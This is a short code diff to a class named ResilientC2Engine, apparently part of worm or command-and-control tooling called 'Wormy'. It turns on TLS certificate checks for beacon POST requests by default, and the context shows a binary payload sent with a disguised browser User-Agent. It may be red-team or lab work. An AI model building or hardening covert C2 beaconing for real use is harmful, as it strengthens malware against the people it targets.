@@ -447,9 +447,14 @@ class ResilientC2Engine:
         try:
             import ssl
 
+            # SECURITY: certificate verification is ON by default
+            # (WORMY_SSL_VERIFY=0 disables it for lab use with self-signed
+            # certs). The previous hardcoded CERT_NONE made every beacon
+            # transparently interceptable by a MITM.
             ctx = ssl.create_default_context()
-            ctx.check_hostname = False
-            ctx.verify_mode = ssl.CERT_NONE
+            if os.getenv("WORMY_SSL_VERIFY", "1") in ("0", "false", "no"):
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
             req = urllib.request.Request(url, data=payload, method="POST")
             req.add_header("Content-Type", "application/octet-stream")
             req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
